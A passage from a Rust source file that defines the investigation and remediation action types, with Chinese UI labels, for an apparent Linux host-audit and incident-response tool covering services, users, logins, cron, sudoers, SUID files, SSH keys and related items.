                ServiceInvestigationGroup::Security
            }
            Self::ServiceFile | Self::Timers | Self::Environment => {
                ServiceInvestigationGroup::Advanced
            }
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::LiveLogs => Duration::from_secs(15),
            _ => Duration::from_secs(20),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceInvestigationRequest {
    row_id: String,
    unit: String,
    action: ServiceInvestigationAction,
}

impl ServiceInvestigationRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn unit(&self) -> &str {
        &self.unit
    }

    pub const fn action(&self) -> ServiceInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        service_investigation_command(&self.unit, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ServiceInvestigationResult {
    pub row_id: String,
    pub unit: String,
    pub action: ServiceInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ServiceRuntimeAction {
    Start,
    Stop,
    Restart,
    Reload,
    Enable,
    Disable,
    Mask,
}

impl ServiceRuntimeAction {
    pub const ALL: [Self; 6] = [
        Self::Start,
        Self::Stop,
        Self::Restart,
        Self::Reload,
        Self::Enable,
        Self::Disable,
    ];

    pub const AUTOSTART: [Self; 3] = [Self::Start, Self::Enable, Self::Disable];
    pub const TIMER: [Self; 3] = [Self::Stop, Self::Disable, Self::Mask];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Start => "启动服务",
            Self::Stop => "停止服务",
            Self::Restart => "重启服务",
            Self::Reload => "重新加载配置",
            Self::Enable => "启用开机自启",
            Self::Disable => "禁用开机自启",
            Self::Mask => "屏蔽单元",
        }
    }

    const fn command(self) -> &'static str {
        match self {
            Self::Start => "start",
            Self::Stop => "stop",
            Self::Restart => "restart",
            Self::Reload => "reload",
            Self::Enable => "enable",
            Self::Disable => "disable",
            Self::Mask => "mask",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ServiceStateSnapshot {
    pub unit: String,
    pub load_state: String,
    pub active_state: String,
    pub sub_state: String,
    pub unit_file_state: String,
    pub main_pid: u32,
    pub fragment_path: String,
    pub can_reload: bool,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimeRequest {
    row_id: String,
    unit: String,
    action: ServiceRuntimeAction,
}

impl ServiceRuntimeRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn unit(&self) -> &str {
        &self.unit
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimePlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: ServiceStateSnapshot,
    action: ServiceRuntimeAction,
}

impl ServiceRuntimePlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &ServiceStateSnapshot {
        &self.snapshot
    }

    pub const fn action(&self) -> ServiceRuntimeAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ServiceRuntimeOutcome {
    pub unit: String,
    pub action: ServiceRuntimeAction,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserInvestigationGroup {
    Basics,
    Credentials,
    Permissions,
    Activity,
    Resources,
    Security,
}

impl UserInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::Basics,
        Self::Credentials,
        Self::Permissions,
        Self::Activity,
        Self::Resources,
        Self::Security,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Basics => "基本信息",
            Self::Credentials => "账户状态",
            Self::Permissions => "权限分析",
            Self::Activity => "活动监控",
            Self::Resources => "资源使用",
            Self::Security => "安全检查",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserInvestigationAction {
    Details,
    Groups,
    HomeDirectory,
    PasswordExpiry,
    AccountStatus,
    SudoPermissions,
    GroupMembership,
    SshKeys,
    LoginHistory,
    CurrentSessions,
    FailedLogins,
    LastLogin,
    Processes,
    DiskUsage,
    OpenFiles,
    AbnormalLogin,
    Crontab,
    SshConfig,
    SuspiciousFiles,
    SuidFiles,
}

impl UserInvestigationAction {
    pub const ALL: [Self; 20] = [
        Self::Details,
        Self::Groups,
        Self::HomeDirectory,
        Self::PasswordExpiry,
        Self::AccountStatus,
        Self::SudoPermissions,
        Self::GroupMembership,
        Self::SshKeys,
        Self::LoginHistory,
        Self::CurrentSessions,
        Self::FailedLogins,
        Self::LastLogin,
        Self::Processes,
        Self::DiskUsage,
        Self::OpenFiles,
        Self::AbnormalLogin,
        Self::Crontab,
        Self::SshConfig,
        Self::SuspiciousFiles,
        Self::SuidFiles,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "用户详情",
            Self::Groups => "用户组信息",
            Self::HomeDirectory => "主目录信息",
            Self::PasswordExpiry => "密码过期时间",
            Self::AccountStatus => "账户状态",
            Self::SudoPermissions => "Sudo 权限",
            Self::GroupMembership => "用户组成员",
            Self::SshKeys => "SSH 密钥",
            Self::LoginHistory => "登录历史",
            Self::CurrentSessions => "当前会话",
            Self::FailedLogins => "失败登录",
            Self::LastLogin => "最后登录",
            Self::Processes => "用户进程",
            Self::DiskUsage => "磁盘使用",
            Self::OpenFiles => "打开文件",
            Self::AbnormalLogin => "异常登录检查",
            Self::Crontab => "定时任务",
            Self::SshConfig => "SSH 配置",
            Self::SuspiciousFiles => "可疑文件",
            Self::SuidFiles => "SUID / SGID 文件",
        }
    }

    pub const fn group(self) -> UserInvestigationGroup {
        match self {
            Self::Details | Self::Groups | Self::HomeDirectory => UserInvestigationGroup::Basics,
            Self::PasswordExpiry | Self::AccountStatus => UserInvestigationGroup::Credentials,
            Self::SudoPermissions | Self::GroupMembership | Self::SshKeys => {
                UserInvestigationGroup::Permissions
            }
            Self::LoginHistory | Self::CurrentSessions | Self::FailedLogins | Self::LastLogin => {
                UserInvestigationGroup::Activity
            }
            Self::Processes | Self::DiskUsage | Self::OpenFiles => {
                UserInvestigationGroup::Resources
            }
            Self::AbnormalLogin
            | Self::Crontab
            | Self::SshConfig
            | Self::SuspiciousFiles
            | Self::SuidFiles => UserInvestigationGroup::Security,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::DiskUsage | Self::SuspiciousFiles | Self::SuidFiles => Duration::from_secs(30),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserIdentity {
    pub row_id: String,
    pub username: String,
    pub uid: u32,
    pub gid: u32,
    pub home: String,
    pub shell: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserInvestigationRequest {
    identity: UserIdentity,
    action: UserInvestigationAction,
}

impl UserInvestigationRequest {
    pub fn identity(&self) -> &UserIdentity {
        &self.identity
    }

    pub const fn action(&self) -> UserInvestigationAction {
        self.action
    }

    fn command(&self) -> String {
        user_investigation_command(&self.identity.username, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserInvestigationResult {
    pub row_id: String,
    pub username: String,
    pub action: UserInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum LoginInvestigationGroup {
    User,
    Source,
    Logs,
}

impl LoginInvestigationGroup {
    pub const ALL: [Self; 3] = [Self::User, Self::Source, Self::Logs];

    pub const fn label(self) -> &'static str {
        match self {
            Self::User => "用户分析",
            Self::Source => "来源分析",
            Self::Logs => "日志审计",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum LoginInvestigationAction {
    UserDetails,
    UserLoginCount,
    UserFailedCount,
    UserSudoHistory,
    SourceLogins,
    Whois,
    ReverseDns,
    AuthLogs,
    RecentFailures,
    BruteForceCheck,
}

impl LoginInvestigationAction {
    pub const ALL: [Self; 10] = [
        Self::UserDetails,
        Self::UserLoginCount,
        Self::UserFailedCount,
        Self::UserSudoHistory,
        Self::SourceLogins,
        Self::Whois,
        Self::ReverseDns,
        Self::AuthLogs,
        Self::RecentFailures,
        Self::BruteForceCheck,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::UserDetails => "用户详情",
            Self::UserLoginCount => "用户登录统计",
            Self::UserFailedCount => "用户失败登录",
            Self::UserSudoHistory => "用户 Sudo 记录",
            Self::SourceLogins => "来源 IP 登录记录",
            Self::Whois => "WHOIS 查询",
            Self::ReverseDns => "反向 DNS 查询",
            Self::AuthLogs => "认证日志",
            Self::RecentFailures => "最近失败登录",
            Self::BruteForceCheck => "暴力破解检测",
        }
    }

    pub const fn group(self) -> LoginInvestigationGroup {
        match self {
            Self::UserDetails
            | Self::UserLoginCount
            | Self::UserFailedCount
            | Self::UserSudoHistory => LoginInvestigationGroup::User,
            Self::SourceLogins | Self::Whois | Self::ReverseDns => LoginInvestigationGroup::Source,
            Self::AuthLogs | Self::RecentFailures | Self::BruteForceCheck => {
                LoginInvestigationGroup::Logs
            }
        }
    }

    const fn requires_source(self) -> bool {
        matches!(self, Self::SourceLogins | Self::Whois | Self::ReverseDns)
    }

    const fn requires_current_user(self) -> bool {
        matches!(
            self,
            Self::UserDetails
                | Self::UserLoginCount
                | Self::UserFailedCount
                | Self::UserSudoHistory
                | Self::AuthLogs
        )
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Whois => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct LoginIdentity {
    pub row_id: String,
    pub username: String,
    pub terminal: String,
    pub source: Option<IpAddr>,
    pub login_time: String,
    pub status: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct LoginInvestigationRequest {
    identity: LoginIdentity,
    action: LoginInvestigationAction,
}

impl LoginInvestigationRequest {
    pub fn identity(&self) -> &LoginIdentity {
        &self.identity
    }

    pub const fn action(&self) -> LoginInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        login_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct LoginInvestigationResult {
    pub row_id: String,
    pub username: String,
    pub source: Option<IpAddr>,
    pub action: LoginInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum PackageInvestigationAction {
    Details,
    Files,
    Dependencies,
    Changelog,
    Integrity,
    ConfigFiles,
    RelatedServices,
    RemovalPreview,
}

impl PackageInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Details,
        Self::Files,
        Self::Dependencies,
        Self::Changelog,
        Self::Integrity,
        Self::ConfigFiles,
        Self::RelatedServices,
        Self::RemovalPreview,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "包详细信息",
            Self::Files => "列出包文件",
            Self::Dependencies => "查看依赖关系",
            Self::Changelog => "本地变更日志",
            Self::Integrity => "验证完整性",
            Self::ConfigFiles => "检查配置文件修改",
            Self::RelatedServices => "相关服务",
            Self::RemovalPreview => "卸载影响预览",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum KernelModuleInvestigationAction {
    Info,
    Dependencies,
    Parameters,
    Path,
    Signing,
    Taint,
    Hash,
    Dmesg,
}

impl KernelModuleInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Info,
        Self::Dependencies,
        Self::Parameters,
        Self::Path,
        Self::Signing,
        Self::Taint,
        Self::Hash,
        Self::Dmesg,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Info => "模块详情",
            Self::Dependencies => "依赖关系",
            Self::Parameters => "运行参数",
            Self::Path => "模块文件路径",
            Self::Signing => "签名信息",
            Self::Taint => "内核污染标志",
            Self::Hash => "模块文件哈希",
            Self::Dmesg => "相关 dmesg 日志",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum EnvVarInvestigationAction {
    TraceSource,
    LdPreload,
    PathDirectories,
    ProcessOwners,
}

impl EnvVarInvestigationAction {
    pub const ALL: [Self; 4] = [
        Self::TraceSource,
        Self::LdPreload,
        Self::PathDirectories,
        Self::ProcessOwners,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::TraceSource => "追踪变量来源",
            Self::LdPreload => "检查动态链接劫持",
            Self::PathDirectories => "检查 PATH 目录权限",
            Self::ProcessOwners => "进程中的同名变量",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum StartupInvestigationAction {
    Details,
    Command,
    UnitFile,
    StartupType,
    ConfigLocation,
    ViewConfig,
    SuspiciousPath,
    FileSignature,
    ModificationTime,
    MalwareIndicators,
    Dependencies,
    BootOrder,
    BootTime,
    ResourceUsage,
    StartupLogs,
    ErrorLogs,
    RunHistory,
    ConfigSummary,
}

impl StartupInvestigationAction {
    pub const ALL: [Self; 18] = [
        Self::Details,
        Self::Command,
        Self::UnitFile,
        Self::StartupType,
        Self::ConfigLocation,
        Self::ViewConfig,
        Self::SuspiciousPath,
        Self::FileSignature,
        Self::ModificationTime,
        Self::MalwareIndicators,
        Self::Dependencies,
        Self::BootOrder,
        Self::BootTime,
        Self::ResourceUsage,
        Self::StartupLogs,
        Self::ErrorLogs,
        Self::RunHistory,
        Self::ConfigSummary,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "启动项详情",
            Self::Command => "启动命令",
            Self::UnitFile => "单元文件内容",
            Self::StartupType => "启用方式与目标",
            Self::ConfigLocation => "配置文件位置",
            Self::ViewConfig => "完整有效配置",
            Self::SuspiciousPath => "可疑路径检查",
            Self::FileSignature => "配置文件哈希",
            Self::ModificationTime => "配置修改时间",
            Self::MalwareIndicators => "恶意特征检查",
            Self::Dependencies => "依赖关系",
            Self::BootOrder => "启动顺序",
            Self::BootTime => "启动耗时",
            Self::ResourceUsage => "资源使用",
            Self::StartupLogs => "启动日志",
            Self::ErrorLogs => "错误日志",
            Self::RunHistory => "运行历史",
            Self::ConfigSummary => "配置汇总",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum CronInvestigationAction {
    ViewSource,
    Details,
    Schedule,
    Command,
    ViewCrontab,
    ExecutionLogs,
    RecentRuns,
    ErrorLogs,
    ParseSchedule,
    NextRun,
    Frequency,
    SecurityCheck,
    PathCheck,
    SuspiciousCheck,
    ExportRecord,
}

impl CronInvestigationAction {
    pub const ALL: [Self; 15] = [
        Self::ViewSource,
        Self::Details,
        Self::Schedule,
        Self::Command,
        Self::ViewCrontab,
        Self::ExecutionLogs,
        Self::RecentRuns,
        Self::ErrorLogs,
        Self::ParseSchedule,
        Self::NextRun,
        Self::Frequency,
        Self::SecurityCheck,
        Self::PathCheck,
        Self::SuspiciousCheck,
        Self::ExportRecord,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewSource => "查看来源文件",
            Self::Details => "任务详情",
            Self::Schedule => "时间表达式",
            Self::Command => "任务命令（只读）",
            Self::ViewCrontab => "定位原始条目",
            Self::ExecutionLogs => "执行日志",
            Self::RecentRuns => "近期运行",
            Self::ErrorLogs => "错误日志",
            Self::ParseSchedule => "解析时间表达式",
            Self::NextRun => "下次匹配预览",
            Self::Frequency => "频率说明",
            Self::SecurityCheck => "命令安全检查",
            Self::PathCheck => "可执行路径检查",
            Self::SuspiciousCheck => "可疑特征检查",
            Self::ExportRecord => "导出当前记录",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum TimerInvestigationAction {
    TimerStatus,
    TimerConfig,
    UnitStatus,
    UnitConfig,
    TimerLogs,
    UnitLogs,
}

impl TimerInvestigationAction {
    pub const ALL: [Self; 6] = [
        Self::TimerStatus,
        Self::TimerConfig,
        Self::UnitStatus,
        Self::UnitConfig,
        Self::TimerLogs,
        Self::UnitLogs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::TimerStatus => "定时器状态",
            Self::TimerConfig => "定时器配置",
            Self::UnitStatus => "触发单元状态",
            Self::UnitConfig => "触发单元配置",
            Self::TimerLogs => "定时器日志",
            Self::UnitLogs => "触发单元日志",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ShellConfigInvestigationAction {
    ViewContext,
    ViewFile,
    Permissions,
    History,
    SuspiciousLines,
    OwnerCheck,
}

impl ShellConfigInvestigationAction {
    pub const ALL: [Self; 6] = [
        Self::ViewContext,
        Self::ViewFile,
        Self::Permissions,
        Self::History,
        Self::SuspiciousLines,
        Self::OwnerCheck,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewContext => "查看上下文",
            Self::ViewFile => "查看完整文件",
            Self::Permissions => "文件权限与 ACL",
            Self::History => "文件时间线线索",
            Self::SuspiciousLines => "全部可疑配置",
            Self::OwnerCheck => "所有者检查",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SudoersInvestigationAction {
    ViewSudoers,
    ViewSource,
    SyntaxCheck,
    ListDropIns,
    UserPermissions,
    UserHistory,
    UserGroups,
    FindNoPassword,
}

impl SudoersInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::ViewSudoers,
        Self::ViewSource,
        Self::SyntaxCheck,
        Self::ListDropIns,
        Self::UserPermissions,
        Self::UserHistory,
        Self::UserGroups,
        Self::FindNoPassword,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::ViewSudoers => "查看主 sudoers",
            Self::ViewSource => "查看来源文件",
            Self::SyntaxCheck => "语法检查",
            Self::ListDropIns => "列出 sudoers.d",
            Self::UserPermissions => "用户 sudo 权限",
            Self::UserHistory => "用户 sudo 历史",
            Self::UserGroups => "用户组信息",
            Self::FindNoPassword => "查找 NOPASSWD",
        }
    }

    const fn requires_username(self) -> bool {
        matches!(
            self,
            Self::UserPermissions | Self::UserHistory | Self::UserGroups
        )
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SuidFileInvestigationAction {
    Details,
    FileType,
    Hash,
    Strings,
    Package,
    Integrity,
    Capabilities,
    Links,
}

impl SuidFileInvestigationAction {
    pub const ALL: [Self; 8] = [
        Self::Details,
        Self::FileType,
        Self::Hash,
        Self::Strings,
        Self::Package,
        Self::Integrity,
        Self::Capabilities,
        Self::Links,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Details => "文件详情",
            Self::FileType => "文件类型",
            Self::Hash => "计算哈希",
            Self::Strings => "可疑字符串",
            Self::Package => "所属软件包",
            Self::Integrity => "软件包完整性",
            Self::Capabilities => "文件能力",
            Self::Links => "硬链接与符号链接",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum SshKeyInvestigationAction {
    AuthorizedKeys,
    Fingerprint,
    Permissions,
    SshDirectory,
    KeyAge,
    AllUserKeys,
    SshdConfig,
}

impl SshKeyInvestigationAction {
    pub const ALL: [Self; 7] = [
        Self::AuthorizedKeys,
        Self::Fingerprint,
        Self::Permissions,
        Self::SshDirectory,
        Self::KeyAge,
        Self::AllUserKeys,
        Self::SshdConfig,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::AuthorizedKeys => "查看 authorized_keys",
            Self::Fingerprint => "公钥指纹",
            Self::Permissions => "密钥文件权限",
            Self::SshDirectory => "SSH 目录检查",
            Self::KeyAge => "密钥文件时间线",
            Self::AllUserKeys => "全部用户公钥",
            Self::SshdConfig => "公钥认证配置",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ArtifactInvestigationAction {
    Package(PackageInvestigationAction),
    KernelModule(KernelModuleInvestigationAction),
    Environment(EnvVarInvestigationAction),
    Startup(StartupInvestigationAction),
    Cron(CronInvestigationAction),
    Timer(TimerInvestigationAction),
    ShellConfig(ShellConfigInvestigationAction),
    Sudoers(SudoersInvestigationAction),
    SuidFile(SuidFileInvestigationAction),
    SshKey(SshKeyInvestigationAction),
}

impl ArtifactInvestigationAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Package(action) => action.label(),
            Self::KernelModule(action) => action.label(),
            Self::Environment(action) => action.label(),
            Self::Startup(action) => action.label(),
            Self::Cron(action) => action.label(),
            Self::Timer(action) => action.label(),
            Self::ShellConfig(action) => action.label(),
            Self::Sudoers(action) => action.label(),
            Self::SuidFile(action) => action.label(),
            Self::SshKey(action) => action.label(),
        }
    }

    pub const fn tab(self) -> SystemInfoTab {
        match self {
            Self::Package(_) => SystemInfoTab::Packages,
            Self::KernelModule(_) => SystemInfoTab::KernelModules,
            Self::Environment(_) => SystemInfoTab::EnvVars,
            Self::Startup(_) => SystemInfoTab::Autostart,
            Self::Cron(_) => SystemInfoTab::Cron,
            Self::Timer(_) => SystemInfoTab::Timers,
            Self::ShellConfig(_) => SystemInfoTab::ShellConfigs,
            Self::Sudoers(_) => SystemInfoTab::Sudoers,
            Self::SuidFile(_) => SystemInfoTab::SuidFiles,
            Self::SshKey(_) => SystemInfoTab::SshKeys,
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Package(PackageInvestigationAction::RemovalPreview) => Duration::from_secs(30),
            Self::KernelModule(KernelModuleInvestigationAction::Dmesg) => Duration::from_secs(20),
            Self::Cron(CronInvestigationAction::NextRun) => Duration::from_secs(20),
            Self::SuidFile(SuidFileInvestigationAction::Strings) => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub enum ArtifactIdentity {
    Package {
        row_id: String,
        name: String,
    },
    KernelModule {
        row_id: String,
        name: String,
    },
    Environment {
        row_id: String,
        name: String,
    },
    Startup {
        row_id: String,
        unit: String,
    },
    Cron {
        row_id: String,
        username: String,
        schedule: String,
        command: String,
        source: String,
    },
    Timer {
        row_id: String,
        timer: String,
        trigger: String,
    },
    ShellConfig {
        row_id: String,
        path: String,
        line: u32,
    },
    Sudoers {
        row_id: String,
        principal: String,
        username: Option<String>,
        source: String,
    },
    SuidFile {
        row_id: String,
        path: String,
    },
    SshKey {
        row_id: String,
        username: String,
        key_type: String,
        key_content: String,
        path: String,
    },
}

impl ArtifactIdentity {
    pub fn row_id(&self) -> &str {
        match self {
            Self::Package { row_id, .. }
            | Self::KernelModule { row_id, .. }
            | Self::Environment { row_id, .. }
            | Self::Startup { row_id, .. }
            | Self::Cron { row_id, .. }
            | Self::Timer { row_id, .. }
            | Self::ShellConfig { row_id, .. }
            | Self::Sudoers { row_id, .. }
            | Self::SuidFile { row_id, .. }
            | Self::SshKey { row_id, .. } => row_id,
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactInvestigationRequest {
    identity: ArtifactIdentity,
    action: ArtifactInvestigationAction,
}

impl ArtifactInvestigationRequest {
    pub fn identity(&self) -> &ArtifactIdentity {
        &self.identity
    }

    pub const fn action(&self) -> ArtifactInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        artifact_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct ArtifactInvestigationResult {
    pub row_id: String,
    pub action: ArtifactInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ArtifactMutationAction {
    DeleteCronFile,
    CommentShellLine,
    RemoveSuidBits,
    QuarantineSuidFile,
    AddManagedModuleBlacklist,
    RemoveManagedModuleBlacklist,
}

impl ArtifactMutationAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::DeleteCronFile => "删除独立 Cron 文件",
            Self::CommentShellLine => "注释此行",
            Self::RemoveSuidBits => "移除 SUID/SGID 位",
            Self::QuarantineSuidFile => "权限隔离（000）",
            Self::AddManagedModuleBlacklist => "阻止模块自动加载",
            Self::RemoveManagedModuleBlacklist => "移除 LovelyRes 模块黑名单",
        }
    }

    pub const fn tab(self) -> SystemInfoTab {
        match self {
            Self::DeleteCronFile => SystemInfoTab::Cron,
            Self::CommentShellLine => SystemInfoTab::ShellConfigs,
            Self::RemoveSuidBits | Self::QuarantineSuidFile => SystemInfoTab::SuidFiles,
            Self::AddManagedModuleBlacklist | Self::RemoveManagedModuleBlacklist => {
                SystemInfoTab::KernelModules
            }
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
enum ArtifactMutationIdentity {
    CronFile {
        row_id: String,
        path: RemotePath,
    },
    ShellLine {
        row_id: String,
        path: RemotePath,
        line: u32,
        displayed_content: String,
    },
    SuidFile {
        row_id: String,
        path: RemotePath,
        displayed_mode: u32,
    },
    KernelModulePolicy {
        row_id: String,
        module: String,
        path: RemotePath,
    },
}

impl ArtifactMutationIdentity {
    fn row_id(&self) -> &str {
        match self {
            Self::CronFile { row_id, .. }
            | Self::ShellLine { row_id, .. }
            | Self::SuidFile { row_id, .. }
            | Self::KernelModulePolicy { row_id, .. } => row_id,
        }
    }

    fn path(&self) -> &RemotePath {
        match self {
            Self::CronFile { path, .. }
            | Self::ShellLine { path, .. }
            | Self::SuidFile { path, .. }
            | Self::KernelModulePolicy { path, .. } => path,
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactMutationRequest {
    identity: ArtifactMutationIdentity,
    action: ArtifactMutationAction,
}

impl ArtifactMutationRequest {
    pub fn row_id(&self) -> &str {
        self.identity.row_id()
    }

    pub fn path(&self) -> &RemotePath {
        self.identity.path()
    }

    pub const fn action(&self) -> ArtifactMutationAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct SuidFileSnapshot {
    pub path: RemotePath,
    pub sha256: String,
    pub mode: u32,
    pub uid: u32,
    pub gid: u32,
    pub size: u64,
    pub device: u64,
    pub inode: u64,
}

#[derive(Debug, Clone, Eq, PartialEq)]
struct SuidPermissionPlan {
    operation: OperationPlan,
    snapshot: SuidFileSnapshot,
    target_mode: u32,
    backup_directory: RemotePath,
    backup_path: RemotePath,
}

#[derive(Debug)]
enum ArtifactMutationPlanKind {
    Sftp(Box<SftpPlannedOperation>),
    Suid(Box<SuidPermissionPlan>),
}

#[derive(Debug)]
pub struct ArtifactMutationPlan {
    row_id: String,
    action: ArtifactMutationAction,
    path: RemotePath,
    kind: ArtifactMutationPlanKind,
}

impl ArtifactMutationPlan {
    pub fn definition(&self) -> &OperationPlan {
        match &self.kind {
            ArtifactMutationPlanKind::Sftp(operation) => operation.definition(),
            ArtifactMutationPlanKind::Suid(plan) => &plan.operation,
        }
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub const fn action(&self) -> ArtifactMutationAction {
        self.action
    }

    pub fn path(&self) -> &RemotePath {
        &self.path
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct ArtifactMutationOutcome {
    pub row_id: String,
    pub action: ArtifactMutationAction,
    pub path: RemotePath,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserAccountAction {
    Lock,
    Unlock,
}

impl UserAccountAction {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Lock => "锁定用户账户",
            Self::Unlock => "解锁用户账户",
        }
    }

    const fn command(self) -> &'static str {
        match self {
            Self::Lock => "-l",
            Self::Unlock => "-u",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountRequest {
    row_id: String,
    username: String,
    action: UserAccountAction,
}

impl UserAccountRequest {
    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn username(&self) -> &str {
        &self.username
    }

    pub const fn action(&self) -> UserAccountAction {
        self.action
    }
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum UserPasswordState {
    Locked,
    PasswordSet,
    NoPassword,
}

impl UserPasswordState {
    const fn label(self) -> &'static str {
        match self {
            Self::Locked => "locked",
            Self::PasswordSet => "password-set",
            Self::NoPassword => "no-password",
        }
    }
}

